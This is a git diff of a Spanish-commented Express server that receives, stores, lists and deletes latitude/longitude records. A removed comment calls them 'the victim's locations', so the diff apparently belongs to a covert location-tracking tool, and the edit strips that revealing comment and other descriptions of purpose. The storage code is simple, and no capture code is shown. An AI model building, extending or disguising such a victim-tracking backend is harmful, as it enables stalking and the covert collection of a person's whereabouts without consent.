@@ -9,12 +9,12 @@ const port = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// Sirve todos los archivos de la carpeta principal
+//archivos de carpeta principal
 app.use(express.static(path.join(__dirname, '..')));
 
 const dataFilePath = path.join(__dirname, 'ubicaciones.json');
 
-// Endpoint para recibir las ubicaciones de la víctima
+//endpoint -> ubicaciones
 app.post('/api/ubicacion', (req, res) => {
     const { lat, lon } = req.body;
     const timestamp = new Date().toISOString();
@@ -26,7 +26,7 @@ app.post('/api/ubicacion', (req, res) => {
         if (!err && data) {
             try {
                 ubicaciones = JSON.parse(data);
-                // Si el array no está vacío, encuentra el ID del último elemento y lo incrementa
+                //id con orden
                 if (ubicaciones.length > 0) {
                     const lastLocation = ubicaciones[ubicaciones.length - 1];
                     nextId = parseInt(lastLocation.id) + 1;
@@ -52,7 +52,7 @@ app.post('/api/ubicacion', (req, res) => {
     });
 });
 
-// Endpoint para que el cliente obtenga todas las ubicaciones
+
 app.get('/api/ubicaciones', (req, res) => {
     fs.readFile(dataFilePath, 'utf8', (err, data) => {
         if (err) {
@@ -61,12 +61,12 @@ app.get('/api/ubicaciones', (req, res) => {
         try {
             res.status(200).send(JSON.parse(data));
         } catch (e) {
-            res.status(500).send({ message: 'Error al leer las ubicaciones.' });
+            res.status(500).send({ message: 'Error al leer las ubicaciones' });
         }
     });
 });
 
-// NUEVO: Endpoint para borrar una ubicación por su ID
+
 app.delete('/api/ubicacion/:id', (req, res) => {
     const locationId = req.params.id;
     fs.readFile(dataFilePath, 'utf8', (err, data) => {
